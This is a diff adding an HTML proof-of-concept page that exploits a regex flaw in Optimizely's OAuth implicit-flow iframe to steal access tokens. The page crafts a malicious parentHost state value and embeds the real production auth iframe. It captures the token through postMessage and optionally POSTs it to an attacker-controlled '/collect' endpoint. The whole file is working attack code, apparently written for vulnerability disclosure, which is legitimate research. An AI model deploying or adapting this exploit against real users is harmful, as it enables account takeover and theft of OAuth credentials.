@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Optimizely OAuth token theft — PoC</title>
+    <style>
+      body { font-family: monospace; margin: 24px; }
+      #leak { color: #b00; white-space: pre-wrap; word-break: break-all; }
+      iframe { border: 1px solid #ccc; }
+    </style>
+  </head>
+  <body>
+    <h3>Optimizely OAuth token theft — PoC</h3>
+    <p>Attacker origin: <b id="orig"></b></p>
+
+    <!-- 1. parentHost = our own origin + a fragment that satisfies the victim's regex -->
+    <p id="status">loading iframe...</p>
+    <pre id="leak">waiting for token...</pre>
+
+    <iframe id="f" width="1" height="1"></iframe>
+
+    <script>
+      const origin = location.origin;                 // e.g. https://yophish.app
+      document.getElementById('orig').textContent = origin;
+
+      // Malicious state -> parentHost = "https://yophish.app#.app.optimizely.com"
+      const parentHost = origin + "#.app.optimizely.com";
+      const state = encodeURIComponent(JSON.stringify({ parentHost }));
+
+      // The REAL production auth iframe.
+      // (Synthetic token stands in for the victim's live token that the OAuth
+      //  implicit flow puts in this fragment in a real attack.)
+      const src = "https://app.optimizely.com/implicit_auth_iframe.html"
+                + "#access_token=STOLEN_SECRET_TOKEN_123"
+                + "&state=" + state;
+      document.getElementById('f').src = src;
+      document.getElementById('status').textContent = "iframe: " + src.split('#')[0];
+
+      // Receive the token the victim's iframe posts to us
+      window.addEventListener('message', (e) => {
+        const out = document.getElementById('leak');
+        out.textContent =
+          "LEAKED FROM ORIGIN: " + e.origin + "\n" +
+          "DATA: " + JSON.stringify(e.data, null, 2);
+        // optional server-side copy (remove if not wanted)
+        try { fetch('/collect', { method: 'POST', body: JSON.stringify(e.data) }); } catch (_) {}
+      });
+    </script>
+  </body>
+</html>
